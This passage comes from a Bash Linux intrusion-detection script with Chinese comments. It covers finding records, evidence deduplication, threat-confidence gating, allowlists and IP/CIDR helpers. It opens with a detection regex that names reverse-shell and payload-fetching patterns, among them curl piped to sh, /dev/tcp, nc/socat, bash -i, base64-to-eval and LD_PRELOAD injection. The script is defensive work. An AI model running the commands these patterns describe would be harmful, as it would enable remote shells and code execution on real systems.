        '(curl|wget)[^#]*(\|[[:space:]]*(sh|bash)|-O[[:space:]]*-|/tmp/|/var/tmp/|/dev/shm/)|/dev/(tcp|udp)/|(^|[;&|[:space:]])(nc|ncat|socat)[[:space:]]|bash[[:space:]]+-i|base64[[:space:]].*(-d|--decode).*(\||eval|[[:space:]](sh|bash))|(^|[;&[:space:]])(LD_PRELOAD|BASH_ENV)[[:space:]]*=|PROMPT_COMMAND[[:space:]]*=.*(curl|wget|/dev/tcp|base64)|eval[[:space:]]+.*(curl|wget|base64|/dev/tcp)|alias[[:space:]]+(ls|ps|ssh|sudo|passwd)=.*((curl|wget|nc|ncat|netcat|socat|bash|sh|python|perl)[[:space:]]|/tmp/|/var/tmp/|/dev/shm/|/dev/(tcp|udp)/|\$\(|`|[|;])' \
        "$file" 2>/dev/null | grep -Ev '^[[:space:]]*[0-9]+:[[:space:]]*#' | head -10
}

normalize_identity_text() {
    printf '%s' "$1" | LC_ALL=C sed -E \
        -e 's/PID[[:space:]]+[0-9]+/PID/g' \
        -e 's/进程数:[[:space:]]*[0-9]+/进程数/g' \
        -e 's/数量:[[:space:]]*[0-9]+/数量/g' \
        -e 's/得分:[[:space:]]*[0-9]+([/]([0-9]+))?/得分/g' \
        -e 's/[[:space:]]+/ /g' \
        -e 's/^ //;s/ $//'
}

evidence_identity_hash() {
    local canonical
    canonical=$(printf '%s' "$1" | LC_ALL=C sed -E \
        -e 's/[Pp][Ii][Dd][=:[:space:]]*[0-9]+/PID/g' \
        -e 's/pid=[0-9]+/pid=PID/g' \
        -e 's/[0-9]{4}-[0-9]{2}-[0-9]{2}[T ][0-9]{2}:[0-9]{2}:[0-9]{2}(Z|[.][0-9]+|[+-][0-9:]+)?/<TIME>/g' \
        -e 's/[[:space:]]+/ /g' \
        -e 's/^ //;s/ $//')
    sha256_text "$canonical"
}

stable_linux_entity() {
    local supplied="$1" evidence="$2" pid="" start="" exe="" boot="" normalized=""
    boot=$(cat /proc/sys/kernel/random/boot_id 2>/dev/null || true)
    if [[ "$supplied $evidence" =~ ([Pp][Ii][Dd][=:[:space:]]*)([0-9]+) ]]; then pid="${BASH_REMATCH[2]}"; fi
    if [ -n "$pid" ] && [ -r "/proc/${pid}/stat" ]; then
        start=$(awk '{print $22}' "/proc/${pid}/stat" 2>/dev/null)
        exe=$(readlink -f "/proc/${pid}/exe" 2>/dev/null || true)
        [ -n "$boot" ] && [ -n "$start" ] && { printf 'process:%s:%s:%s:%s' "$boot" "$pid" "$start" "${exe:-unknown}"; return; }
    fi
    case "$supplied" in
        /*)
            if [ -f "$supplied" ] && [ ! -L "$supplied" ]; then
                local dev inode hash
                dev=$(stat -c '%d' -- "$supplied" 2>/dev/null || stat -f '%d' -- "$supplied" 2>/dev/null || true)
                inode=$(stat -c '%i' -- "$supplied" 2>/dev/null || stat -f '%i' -- "$supplied" 2>/dev/null || true)
                hash=$(sha256_file "$supplied" 2>/dev/null || true)
                normalized=$(readlink -f -- "$supplied" 2>/dev/null || printf '%s' "$supplied")
                [ -n "$dev$inode$hash" ] && { printf 'file:%s:%s:%s:%s' "$dev" "$inode" "$normalized" "$hash"; return; }
            fi
            printf 'path:%s' "$supplied" ;;
        *) printf '%s' "$supplied" ;;
    esac
}

process_display_for_pid() {
    local pid="$1" current_start row instance ppid uid user exe package cmdline service boot
    [[ "$pid" =~ ^[0-9]+$ ]] || return 1
    current_start=$(awk '{print $22}' "/proc/${pid}/stat" 2>/dev/null) || return 1
    if [ -r "${RAW_DIR:-/nonexistent}/process-context.tsv" ]; then
        row=$(awk -F '\t' -v pid="$pid" -v start="$current_start" 'NR>1 && $3==pid && $4==start {print; exit}' "${RAW_DIR}/process-context.tsv" 2>/dev/null)
    fi
    if [ -n "$row" ]; then
        instance=$(printf '%s\n' "$row" | awk -F '\t' '{print $1}')
        ppid=$(printf '%s\n' "$row" | awk -F '\t' '{print $5}')
        uid=$(printf '%s\n' "$row" | awk -F '\t' '{print $7}')
        exe=$(printf '%s\n' "$row" | awk -F '\t' '{print $11}')
        package=$(printf '%s\n' "$row" | awk -F '\t' '{print $12}')
        cmdline=$(printf '%s\n' "$row" | awk -F '\t' '{print $18}')
    else
        boot=$(cat /proc/sys/kernel/random/boot_id 2>/dev/null || echo unknown)
        instance="process:${boot}:${pid}:${current_start}"
        ppid=$(awk '/^PPid:/ {print $2; exit}' "/proc/${pid}/status" 2>/dev/null)
        uid=$(awk '/^Uid:/ {print $2; exit}' "/proc/${pid}/status" 2>/dev/null)
        exe=$(readlink "/proc/${pid}/exe" 2>/dev/null || echo unknown)
        cmdline=$(tr '\0\t\n' '   ' < "/proc/${pid}/cmdline" 2>/dev/null | head -c 800)
        package=$(file_package_owner "${exe% (deleted)}"); [ -n "$package" ] || package=unowned
    fi
    user=$(getent passwd "$uid" 2>/dev/null | cut -d: -f1); [ -n "$user" ] || user="uid:${uid:-unknown}"
    service=$(sed -nE 's#.*[/]([^/]+[.]service)(/.*)?$#\1#p' "/proc/${pid}/cgroup" 2>/dev/null | head -1); [ -n "$service" ] || service=unassociated
    [ -n "$cmdline" ] || cmdline=unknown
    printf '%s\t%s\t%s\t%s\t%s\t%s\t%s\t%s\n' "$instance" "$pid" "${exe:-unknown}" "$user" "$cmdline" "${ppid:-unknown}" "$service" "${package:-unowned}"
}

enrich_pid_evidence() {
    local evidence="$1" pid display additions="" count=0
    while IFS= read -r pid; do
        [ -n "$pid" ] || continue
        display=$(process_display_for_pid "$pid" 2>/dev/null) || continue
        additions="${additions}${additions:+$'\n'}$(printf '%s' "$display" | awk -F '\t' '{printf "PID=%s; process_instance_id=%s; exe=%s; user=%s; cmdline=%s; ppid=%s; systemd_service=%s; package_owner=%s",$2,$1,$3,$4,$5,$6,$7,$8}')"
        count=$((count + 1)); [ "$count" -ge 8 ] && break
    done < <(printf '%s\n' "$evidence" | grep -oiE 'pid[=:][[:space:]]*[0-9]+' | grep -oE '[0-9]+' | awk '!seen[$0]++')
    [ -z "$additions" ] && printf '%s' "$evidence" || printf '%s\n--- 进程上下文 ---\n%s' "$evidence" "$additions"
}

linux_entity_type() {
    case "$1" in process:*) printf 'PROCESS' ;; file:*|path:*) printf 'FILE' ;; systemd:*|cron:*) printf 'PERSISTENCE_OBJECT' ;; *) printf 'GENERIC' ;; esac
}

auto_rule_id() {
    local category="$1" normalized="$2" prefix="GEN"
    case "$category" in
        users) prefix="USR" ;; process) prefix="PRS" ;; network) prefix="NET" ;;
        rootkit|kernel|injection) prefix="INT" ;; persistence) prefix="PER" ;;
        filesystem) prefix="FS" ;; history) prefix="HIS" ;; logs|attack_chain) prefix="LOG" ;;
        webshell) prefix="WEB" ;; miner) prefix="MIN" ;; reversesh*) prefix="REV" ;;
        credential|backdoor) prefix="SEC" ;; baseline|config) prefix="BAS" ;;
        supplychain) prefix="SUP" ;;
    esac
    printf '%s-%s' "$prefix" "$(sha256_text "${category}|${normalized}" | cut -c1-12)"
}

normalize_evidence_domains() {
    local input="$1" domain out=""
    input=$(printf '%s' "$input" | tr ',;|' '   ' | tr '[:lower:]' '[:upper:]')
    for domain in AUTH PROCESS FILE NETWORK BEACON MEMORY INJECTION PERSISTENCE WEB IPC DNS INTEGRITY DEFENSE_EVASION MALWARE_ENGINE THREAT_INTEL; do
        case " $input " in
            *" $domain "*) out="${out}${out:+,}${domain}" ;;
        esac
    done
    printf '%s' "$out"
}

evidence_domain_count() {
    local normalized
    normalized=$(normalize_evidence_domains "$1")
    [ -n "$normalized" ] || { printf '0'; return; }
    printf '%s' "$normalized" | awk -F',' '{print NF}'
}

infer_evidence_domains() {
    local category="$1" evidence="$2" refs="$3" domains=""
    case "$category" in
        authentication|users) domains="AUTH" ;;
        process|reverseshell|miner) domains="PROCESS" ;;
        filesystem) domains="FILE" ;;
        persistence|backdoor) domains="PERSISTENCE" ;;
        network) domains="NETWORK" ;;
        injection) domains="MEMORY" ;;
        rootkit|kernel) domains="MEMORY,INTEGRITY" ;;
        webshell) domains="WEB" ;;
        credential) domains="MEMORY" ;;
        attack_chain) domains="AUTH,PROCESS" ;;
        supplychain) domains="INTEGRITY" ;;
    esac
    [[ "$evidence $refs" =~ [Ss]ocket|[Cc]onnection|network=|ss_established|公网|外连|矿池 ]] && domains="${domains}${domains:+,}NETWORK"
    [[ "$evidence $refs" =~ file-changes|文件|path=|SHA256=|MD5= ]] && domains="${domains}${domains:+,}FILE"
    [[ "$evidence $refs" =~ [Cc]ron|systemd|authorized_keys|sudoers|PAM|LD_PRELOAD|持久化 ]] && domains="${domains}${domains:+,}PERSISTENCE"
    [[ "$evidence $refs" =~ [Ww]eb|HTTP|nginx|apache|php-fpm|tomcat|gunicorn|uwsgi|caddy|litespeed ]] && domains="${domains}${domains:+,}WEB"
    [[ "$evidence $refs" =~ memfd|rwxp|ptrace|process_vm_writev|/proc/[0-9]+/mem|maps ]] && domains="${domains}${domains:+,}MEMORY"
    [[ "$evidence $refs" =~ package=|包归属|hash|哈希|IMA|YARA ]] && domains="${domains}${domains:+,}INTEGRITY"
    [[ "$evidence $refs" =~ [Yy][Aa][Rr][Aa]|malware|恶意软件|Defender|恶意哈希 ]] && domains="${domains}${domains:+,}MALWARE_ENGINE"
    [[ "$evidence $refs" =~ 清除日志|日志清理|绕过|防御规避|tamper|evasion ]] && domains="${domains}${domains:+,}DEFENSE_EVASION"
    normalize_evidence_domains "$domains"
}

is_direct_high_confidence_rule() {
    case "$1" in
        REV-SOCKET-STDIO|FS-MALICIOUS-HASH|WEB-SHELL-NETWORK|AUTH-BRUTE-LOGIN-ACTION|MEM-INJECTION-CONFIRMED|LOG-SECURITY-CLEAR|YARA-MALICIOUS-HIT|YARA-MALICIOUS-HIT:*|CRD-MEMORY-DUMP-CORRELATED) return 0 ;;
    esac
    return 1
}

apply_threat_gate() {
    local requested_type="$1" rule_id="$2" confidence="$3" domains="$4" count
    THREAT_GATE_TYPE="$requested_type"
    THREAT_GATE_CONFIDENCE="$confidence"
    THREAT_GATE_REASON=""
    count=$(evidence_domain_count "$domains")
    if [ "$requested_type" = "SECURITY_THREAT" ]; then
        if is_direct_high_confidence_rule "$rule_id" && [ "$confidence" = "HIGH" ]; then
            THREAT_GATE_REASON="direct_high_confidence"
        elif [ "$count" -ge 3 ]; then
            THREAT_GATE_REASON="three_independent_domains"
        else
            THREAT_GATE_TYPE="SECURITY_ANOMALY"
            [ "$count" -ge 2 ] && THREAT_GATE_CONFIDENCE="MEDIUM" || THREAT_GATE_CONFIDENCE="LOW"
            THREAT_GATE_REASON="downgraded_insufficient_independent_domains"
        fi
    fi
}

add_attack_chain() {
    local id="$1" title="$2" domains="$3" timeline="$4" evidence="$5"
    ATTACK_CHAIN_IDS+=("$id")
    ATTACK_CHAIN_TITLES+=("$title")
    ATTACK_CHAIN_DOMAINS+=("$(normalize_evidence_domains "$domains")")
    ATTACK_CHAIN_TIMELINES+=("$timeline")
    ATTACK_CHAIN_EVIDENCES+=("$evidence")
}

maintenance_window_active() {
    local now day start end item
    [ -n "$MAINTENANCE_WINDOWS" ] || return 1
    now=$(date '+%H:%M'); day=$(date '+%a' | tr '[:lower:]' '[:upper:]')
    IFS=',' read -r -a _maintenance_items <<< "$MAINTENANCE_WINDOWS"
    for item in "${_maintenance_items[@]}"; do
        item=$(printf '%s' "$item" | tr -d ' ')
        if [[ "$item" =~ ^([A-Z]{3}|\*)@([0-2][0-9]:[0-5][0-9])-([0-2][0-9]:[0-5][0-9])$ ]]; then
            [ "${BASH_REMATCH[1]}" = "*" ] || [ "${BASH_REMATCH[1]}" = "$day" ] || continue
            start="${BASH_REMATCH[2]}"; end="${BASH_REMATCH[3]}"
            if [[ "$start" < "$end" || "$start" = "$end" ]]; then
                [[ "$now" < "$start" || "$now" > "$end" ]] || return 0
            else
                [[ "$now" < "$start" && "$now" > "$end" ]] || return 0
            fi
        fi
    done
    return 1
}

recalculate_severity_counts() {
    SEVERITY_CRITICAL=0; SEVERITY_HIGH=0; SEVERITY_MEDIUM=0; SEVERITY_LOW=0; SEVERITY_OBSERVE=0
    THREAT_CRITICAL=0; THREAT_HIGH=0; THREAT_MEDIUM=0; THREAT_LOW=0
    BASELINE_CRITICAL=0; BASELINE_HIGH=0; BASELINE_MEDIUM=0; BASELINE_LOW=0
    ANOMALY_CRITICAL=0; ANOMALY_HIGH=0; ANOMALY_MEDIUM=0; ANOMALY_LOW=0; ANOMALY_OBSERVE=0
    TRUST_CRITICAL=0; TRUST_HIGH=0; TRUST_MEDIUM=0; TRUST_LOW=0; TRUST_OBSERVE=0
    OBSERVATION_CRITICAL=0; OBSERVATION_HIGH=0; OBSERVATION_MEDIUM=0; OBSERVATION_LOW=0; OBSERVATION_OBSERVE=0
    local idx sev finding_type prefix
    for idx in "${!FINDINGS[@]}"; do
        sev="${FINDING_SEVS[$idx]}"; finding_type="${FINDING_TYPES[$idx]:-SECURITY_THREAT}"
        case "$sev" in
            CRITICAL) SEVERITY_CRITICAL=$((SEVERITY_CRITICAL + 1)) ;;
            HIGH) SEVERITY_HIGH=$((SEVERITY_HIGH + 1)) ;;
            MEDIUM) SEVERITY_MEDIUM=$((SEVERITY_MEDIUM + 1)) ;;
            LOW) SEVERITY_LOW=$((SEVERITY_LOW + 1)) ;;
            OBSERVE) SEVERITY_OBSERVE=$((SEVERITY_OBSERVE + 1)) ;;
        esac
        case "$finding_type" in
            CONFIG_BASELINE) prefix=BASELINE ;;
            SECURITY_ANOMALY) prefix=ANOMALY ;;
            SOFTWARE_TRUST_GAP) prefix=TRUST ;;
            RUNTIME_OBSERVATION) prefix=OBSERVATION ;;
            *) prefix=THREAT ;;
        esac
        case "$prefix:$sev" in
            THREAT:CRITICAL) THREAT_CRITICAL=$((THREAT_CRITICAL + 1)) ;; THREAT:HIGH) THREAT_HIGH=$((THREAT_HIGH + 1)) ;; THREAT:MEDIUM) THREAT_MEDIUM=$((THREAT_MEDIUM + 1)) ;; THREAT:LOW) THREAT_LOW=$((THREAT_LOW + 1)) ;;
            BASELINE:CRITICAL) BASELINE_CRITICAL=$((BASELINE_CRITICAL + 1)) ;; BASELINE:HIGH) BASELINE_HIGH=$((BASELINE_HIGH + 1)) ;; BASELINE:MEDIUM) BASELINE_MEDIUM=$((BASELINE_MEDIUM + 1)) ;; BASELINE:LOW) BASELINE_LOW=$((BASELINE_LOW + 1)) ;;
            ANOMALY:CRITICAL) ANOMALY_CRITICAL=$((ANOMALY_CRITICAL + 1)) ;; ANOMALY:HIGH) ANOMALY_HIGH=$((ANOMALY_HIGH + 1)) ;; ANOMALY:MEDIUM) ANOMALY_MEDIUM=$((ANOMALY_MEDIUM + 1)) ;; ANOMALY:LOW) ANOMALY_LOW=$((ANOMALY_LOW + 1)) ;; ANOMALY:OBSERVE) ANOMALY_OBSERVE=$((ANOMALY_OBSERVE + 1)) ;;
            TRUST:CRITICAL) TRUST_CRITICAL=$((TRUST_CRITICAL + 1)) ;; TRUST:HIGH) TRUST_HIGH=$((TRUST_HIGH + 1)) ;; TRUST:MEDIUM) TRUST_MEDIUM=$((TRUST_MEDIUM + 1)) ;; TRUST:LOW) TRUST_LOW=$((TRUST_LOW + 1)) ;; TRUST:OBSERVE) TRUST_OBSERVE=$((TRUST_OBSERVE + 1)) ;;
            OBSERVATION:CRITICAL) OBSERVATION_CRITICAL=$((OBSERVATION_CRITICAL + 1)) ;; OBSERVATION:HIGH) OBSERVATION_HIGH=$((OBSERVATION_HIGH + 1)) ;; OBSERVATION:MEDIUM) OBSERVATION_MEDIUM=$((OBSERVATION_MEDIUM + 1)) ;; OBSERVATION:LOW) OBSERVATION_LOW=$((OBSERVATION_LOW + 1)) ;; OBSERVATION:OBSERVE) OBSERVATION_OBSERVE=$((OBSERVATION_OBSERVE + 1)) ;;
        esac
    done
}

# 记录一个发现 (severity: CRITICAL/HIGH/MEDIUM/LOW)
record_find() {
    local sev="$1" category="$2" summary="$3" evidence="$4" recommendation="$5" mitre_id="$6"
    local normalized rule_id entity_key fingerprint evidence_hash raw_refs idx finding_type confidence judgment_basis escalation_conditions
    local evidence_domains domain_count counter_evidence timeline requested_finding_type
    evidence=$(enrich_pid_evidence "$evidence")
    normalized=$(normalize_identity_text "$summary")
    rule_id="${7:-$(auto_rule_id "$category" "$normalized")}" 
    entity_key=$(stable_linux_entity "${8:-$normalized}" "$evidence")
    raw_refs="${9:-}"
    finding_type="${10:-$(default_finding_type "$sev" "$category")}"
    requested_finding_type="$finding_type"
    confidence="${11:-$(default_confidence "$finding_type")}"
    judgment_basis="${12:-基于本轮本机只读证据与规则条件；严重度表示处置优先级，不等同于已经确认入侵。}"
    escalation_conditions="${13:-若出现异常路径、执行/外连/持久化关联、恶意哈希或多源证据，应提高风险等级。}"
    evidence_domains="${14:-$(infer_evidence_domains "$category" "$evidence" "$raw_refs")}"
    evidence_domains=$(normalize_evidence_domains "$evidence_domains")
    counter_evidence="${15:-未发现足以降低或排除该判断的可信发布、包归属、维护窗口或历史基线证据。}"
    timeline="${16:-$RUN_STARTED_AT|${CURRENT_MODULE}|${summary}}"
    apply_threat_gate "$finding_type" "$rule_id" "$confidence" "$evidence_domains"
    finding_type="$THREAT_GATE_TYPE"; confidence="$THREAT_GATE_CONFIDENCE"
    domain_count=$(evidence_domain_count "$evidence_domains")
    if [ "$THREAT_GATE_REASON" = "downgraded_insufficient_independent_domains" ]; then
        judgment_basis="${judgment_basis}；威胁门禁因仅有 ${domain_count} 个独立证据域而降级为待研判异常。"
    fi
    fingerprint=$(sha256_text "${rule_id}|${entity_key}")
    evidence_hash=$(evidence_identity_hash "$evidence")

    # 同一轮内相同实体只保留一条 Finding，并合并来源和证据。
    for idx in "${!FINDINGS[@]}"; do
        if [ "${FINDING_FINGERPRINTS[$idx]}" = "$fingerprint" ]; then
            if [ "$(severity_rank "$sev")" -gt "$(severity_rank "${FINDING_SEVS[$idx]}")" ]; then
                FINDING_SEVS[$idx]="$sev"
            fi
            if [[ ",${FINDING_EVIDENCE_PART_HASHES[$idx]}," != *",${evidence_hash},"* ]]; then
                FINDING_EVIDENCES[$idx]="${FINDING_EVIDENCES[$idx]}"$'\n--- '"${CURRENT_MODULE}"$' ---\n'"${evidence}"
                FINDING_EVIDENCE_HASHES[$idx]=$(evidence_identity_hash "${FINDING_EVIDENCES[$idx]}")
                FINDING_EVIDENCE_PART_HASHES[$idx]="${FINDING_EVIDENCE_PART_HASHES[$idx]},${evidence_hash}"
            fi
            case ",${FINDING_MODULES[$idx]}," in
                *,"$CURRENT_MODULE",*) ;;
                *) FINDING_MODULES[$idx]="${FINDING_MODULES[$idx]},${CURRENT_MODULE}" ;;
            esac
            if [ -n "$raw_refs" ]; then
                case ",${FINDING_RAW_REFS[$idx]}," in
                    *,"$raw_refs",*) ;;
                    *) FINDING_RAW_REFS[$idx]="${FINDING_RAW_REFS[$idx]}${FINDING_RAW_REFS[$idx]:+,}${raw_refs}" ;;
                esac
            fi
            FINDING_TYPES[$idx]="$finding_type"
            FINDING_CONFIDENCES[$idx]="$confidence"
            FINDING_JUDGMENT_BASES[$idx]="$judgment_basis"
            FINDING_ESCALATION_CONDITIONS[$idx]="$escalation_conditions"
            FINDING_EVIDENCE_DOMAINS[$idx]=$(normalize_evidence_domains "${FINDING_EVIDENCE_DOMAINS[$idx]},${evidence_domains}")
            FINDING_DOMAIN_COUNTS[$idx]=$(evidence_domain_count "${FINDING_EVIDENCE_DOMAINS[$idx]}")
            FINDING_COUNTER_EVIDENCE[$idx]="$counter_evidence"
            FINDING_TIMELINES[$idx]="${FINDING_TIMELINES[$idx]}${FINDING_TIMELINES[$idx]:+$'\n'}${timeline}"
            [ "${FINDING_TYPES[$idx]}" = "SECURITY_THREAT" ] && requested_finding_type="SECURITY_THREAT"
            apply_threat_gate "$requested_finding_type" "$rule_id" "$confidence" "${FINDING_EVIDENCE_DOMAINS[$idx]}"
            FINDING_TYPES[$idx]="$THREAT_GATE_TYPE"; FINDING_CONFIDENCES[$idx]="$THREAT_GATE_CONFIDENCE"
            return 0
        fi
    done

    FINDING_ID=$((FINDING_ID + 1))
    # 结构化保存，避免将未转义的证据拼进 JSON 后再用正则反解析。
    FINDINGS+=("F-${FINDING_ID}")
    FINDING_SEVS+=("$sev")
    FINDING_CATS+=("$category")
    FINDING_SUMMARIES+=("$summary")
    FINDING_EVIDENCES+=("$evidence")
    FINDING_RECOMMENDATIONS+=("$recommendation")
    FINDING_MITRES+=("$mitre_id")
    FINDING_RULE_IDS+=("$rule_id")
    FINDING_ENTITY_KEYS+=("$entity_key")
    FINDING_ENTITY_TYPES+=("$(linux_entity_type "$entity_key")")
    FINDING_FINGERPRINTS+=("$fingerprint")
    FINDING_EVIDENCE_HASHES+=("$evidence_hash")
    FINDING_EVIDENCE_PART_HASHES+=("$evidence_hash")
    FINDING_MODULES+=("${CURRENT_MODULE:-unknown}")
    FINDING_LIFECYCLES+=("UNCLASSIFIED")
    FINDING_FIRST_SEEN+=("$RUN_STARTED_AT")
    FINDING_LAST_SEEN+=("$RUN_STARTED_AT")
    FINDING_OCCURRENCES+=("1")
    FINDING_RAW_REFS+=("$raw_refs")
    FINDING_TYPES+=("$finding_type")
    FINDING_CONFIDENCES+=("$confidence")
    FINDING_JUDGMENT_BASES+=("$judgment_basis")
    FINDING_ESCALATION_CONDITIONS+=("$escalation_conditions")
    FINDING_EVIDENCE_DOMAINS+=("$evidence_domains")
    FINDING_DOMAIN_COUNTS+=("$domain_count")
    FINDING_COUNTER_EVIDENCE+=("$counter_evidence")
    FINDING_TIMELINES+=("$timeline")
}

# 输出一个发现到终端
emit_find() {
    local sev="$1" summary="$2" evidence="$3" recommendation="$4"
    local icon=""
    case "$sev" in
        CRITICAL) icon="${RED}🔴" ;;
        HIGH)     icon="${RED}🔴" ;;
        MEDIUM)   icon="${YELLOW}🟡" ;;
        LOW)      icon="${GREEN}🟢" ;;
        OBSERVE)  icon="${CYAN}◉" ;;
    esac
    summary=$(term_safe "$summary")
    evidence=$(term_safe "$evidence")
    recommendation=$(term_safe "$recommendation")
    printf '  %b %b[%s]%b %s\n' "$icon" "$BOLD" "$sev" "$NC" "$summary"
    printf '      %b证据:%b %s\n' "$DIM" "$NC" "$evidence"
    [ -n "$recommendation" ] && printf '      %b建议:%b %s\n' "$DIM" "$NC" "$recommendation"
    printf '\n'
}

# 提取 IOC
add_ioc() {
    local ioc_type="$1" value="$2" context="$3"
    # 待研判异常不进入 IOC；调用点只有在当前规则已经通过威胁门禁时才应执行。
    [ "${ALLOW_ANOMALY_IOC:-false}" = true ] || {
        local last_idx=$(( ${#FINDINGS[@]} - 1 ))
        [ "$last_idx" -lt 0 ] || [ "${FINDING_TYPES[$last_idx]:-}" = "SECURITY_THREAT" ] || return 0
    }
    IOCS+=("$(( ${#IOCS[@]} + 1 ))")
    IOC_TYPES+=("$ioc_type")
    IOC_VALUES+=("$value")
    IOC_CONTEXTS+=("$context")
}

record_suppression() {
    local rule_id="$1" entity="$2" reason="$3" evidence="$4" source="$5" expires="$6" owner="$7" idx
    for idx in "${!SUPPRESSION_RULE_IDS[@]}"; do
        if [ "${SUPPRESSION_RULE_IDS[$idx]}|${SUPPRESSION_ENTITIES[$idx]}|${SUPPRESSION_REASONS[$idx]}" = "$rule_id|$entity|$reason" ]; then
            SUPPRESSION_COUNTS[$idx]=$(( ${SUPPRESSION_COUNTS[$idx]} + 1 )); return
        fi
    done
    SUPPRESSION_RULE_IDS+=("$rule_id"); SUPPRESSION_ENTITIES+=("$entity"); SUPPRESSION_REASONS+=("$reason")
    SUPPRESSION_COUNTS+=("1"); SUPPRESSION_EVIDENCES+=("$(printf '%s' "$evidence" | tr '\n\t' '  ' | cut -c1-1000)")
    SUPPRESSION_SOURCES+=("$source"); SUPPRESSION_EXPIRES+=("$expires"); SUPPRESSION_OWNERS+=("$owner")
    SUPPRESSION_COUNT=$((SUPPRESSION_COUNT + 1))
}

write_suppression_audit() {
    local idx
    SUPPRESSION_AUDIT_FILE="${RAW_DIR}/suppression-audit.tsv"
    printf 'rule_id\tstable_entity\tsuppression_reason\thit_count\traw_evidence_summary\tallowlist_source\texpires\towner\n' > "$SUPPRESSION_AUDIT_FILE" || return 1
    for idx in "${!SUPPRESSION_RULE_IDS[@]}"; do
        printf '%s\t%s\t%s\t%s\t%s\t%s\t%s\t%s\n' "${SUPPRESSION_RULE_IDS[$idx]}" "${SUPPRESSION_ENTITIES[$idx]}" "${SUPPRESSION_REASONS[$idx]}" "${SUPPRESSION_COUNTS[$idx]}" "${SUPPRESSION_EVIDENCES[$idx]}" "${SUPPRESSION_SOURCES[$idx]}" "${SUPPRESSION_EXPIRES[$idx]}" "${SUPPRESSION_OWNERS[$idx]}" >> "$SUPPRESSION_AUDIT_FILE"
    done
    chmod 600 "$SUPPRESSION_AUDIT_FILE"; [ "$SUPPRESSION_COUNT" -gt 0 ] && record_raw_status 'suppression-audit.tsv' SUCCESS suppression '' || record_raw_status 'suppression-audit.tsv' NO_RESULTS suppression ''
}

# 检查是否为白名单进程
is_whitelisted() {
    local pname="$1"
    for w in "${WHITELIST_PROCESS[@]}"; do
        if [ "$(printf '%s' "$pname" | tr '[:upper:]' '[:lower:]')" = "$(printf '%s' "$w" | tr '[:upper:]' '[:lower:]')" ]; then record_suppression 'ALLOW-PROCESS' "$pname" '进程白名单仅降低弱启发式信号' "$pname" 'process.allow/built-in' '' ''; return 0; fi
    done
    return 1
}

# 安全读取文件（文件可能不存在或无权限）
safe_cat()  { [ -r "$1" ] && cat "$1" 2>/dev/null; }
safe_read() { [ -r "$1" ] && head -200 "$1" 2>/dev/null; }

read_auth_events() {
    if [ -r "$AUTH_LOG" ]; then
        tail -n 20000 "$AUTH_LOG" 2>/dev/null
    elif command -v journalctl >/dev/null 2>&1; then
        journalctl --no-pager -o short-iso -n 20000 2>/dev/null | grep -Ei 'sshd|sudo'
    fi
}

# 检查进程路径是否为已知白名单路径（监控agent/运维工具）
is_whitelisted_path() {
    local exe_path="$1"
    for wp in "${WHITELIST_PATHS[@]}"; do
        if [[ "$exe_path" == "$wp" || "$exe_path" == "$wp"/* ]]; then record_suppression 'ALLOW-PATH' "$exe_path" '批准路径仅降低弱启发式信号' "$exe_path" 'path.allow/built-in' '' ''; return 0; fi
    done
    # 不再信任整个 /usr/bin、/usr/sbin 等目录；攻击者可能替换其中的文件。
    return 1
}

load_whitelist_file() {
    local kind="$1" file="$2" value expires owner note today
    [ -r "$file" ] || return 0
    today=$(date -u +%Y-%m-%d)
    while IFS='|' read -r value expires owner note; do
        value=$(printf '%s' "$value" | sed 's/^[[:space:]]*//;s/[[:space:]]*$//')
        [[ -z "$value" || "$value" == \#* ]] && continue
        [ -n "$expires" ] && [[ "$expires" < "$today" ]] && continue
        case "$kind" in
            process) WHITELIST_PROCESS+=("$value") ;;
            path) WHITELIST_PATHS+=("$value") ;;
            ip) TRUSTED_REMOTE_IPS+=("$value") ;;
            port) ALLOWED_PORT_RULES+=("$value") ;;
        esac
    done < "$file"
}

load_external_whitelists() {
    local config_dir="${SECSCOPE_CONFIG_DIR:-/etc/secscope}"
    load_whitelist_file process "${config_dir}/process.allow"
    load_whitelist_file path "${config_dir}/path.allow"
    load_whitelist_file ip "${config_dir}/ip.allow"
    load_whitelist_file port "${config_dir}/port.allow"
    load_context_allowlist "$CONTEXT_ALLOW_FILE"
}

load_context_allowlist() {
    local file="$1" path user parent args target owner expires note today
    [ -r "$file" ] || return 0
    today=$(date -u +%Y-%m-%d)
    while IFS='|' read -r path user parent args target owner expires note; do
        path=$(printf '%s' "$path" | sed 's/^[[:space:]]*//;s/[[:space:]]*$//')
        [[ -z "$path" || "$path" == \#* ]] && continue
        [ -n "$owner" ] && [ -n "$expires" ] || continue
        [[ "$expires" < "$today" ]] && continue
        # 至少限定路径，并再限定用户、父进程、参数或目标中的一项；拒绝“放行整个解释器”。
        [ "$path" != "*" ] || continue
        [ -n "$user$parent$args$target" ] || continue
        CONTEXT_ALLOW_RULES+=("$path|$user|$parent|$args|$target|$owner|$expires|$note")
    done < "$file"
}

context_allow_match() {
    local path="$1" user="$2" parent="$3" args="$4" target="$5" rule rp ru rparent rargs rtarget owner expires note
    for rule in "${CONTEXT_ALLOW_RULES[@]}"; do
        IFS='|' read -r rp ru rparent rargs rtarget owner expires note <<< "$rule"
        [[ "$path" == $rp ]] || continue
        [ -z "$ru" ] || [[ "$user" == $ru ]] || continue
        [ -z "$rparent" ] || [[ "$parent" == $rparent ]] || continue
        [ -z "$rargs" ] || printf '%s' "$args" | grep -Eq -- "$rargs" || continue
        [ -z "$rtarget" ] || [[ "$target" == $rtarget ]] || continue
        record_suppression 'ALLOW-CONTEXT' "$(stable_linux_entity "$path" "$args")" '上下文白名单匹配；强行为不受抑制' "user=$user parent=$parent args=$args target=$target" "$CONTEXT_ALLOW_FILE" "$expires" "$owner"
        printf '%s|%s|%s' "$owner" "$expires" "$note"
        return 0
    done
    return 1
}

ipv4_to_int() {
    local ip="$1"
    awk -F. 'NF==4 && $1~/^[0-9]+$/ && $2~/^[0-9]+$/ && $3~/^[0-9]+$/ && $4~/^[0-9]+$/ && $1<=255 && $2<=255 && $3<=255 && $4<=255 {printf "%.0f", (((($1*256)+$2)*256+$3)*256+$4)}' <<< "$ip"
}

ipv4_in_cidr() {
    local ip="$1" cidr="$2" network prefix ip_int net_int block
    network="${cidr%/*}"; prefix="${cidr#*/}"
    [[ "$prefix" =~ ^[0-9]+$ ]] && [ "$prefix" -ge 0 ] && [ "$prefix" -le 32 ] || return 1
    prefix=$((10#$prefix))
    ip_int=$(ipv4_to_int "$ip"); net_int=$(ipv4_to_int "$network")
    [ -n "$ip_int" ] && [ -n "$net_int" ] || return 1
    block=$((2 ** (32 - prefix)))
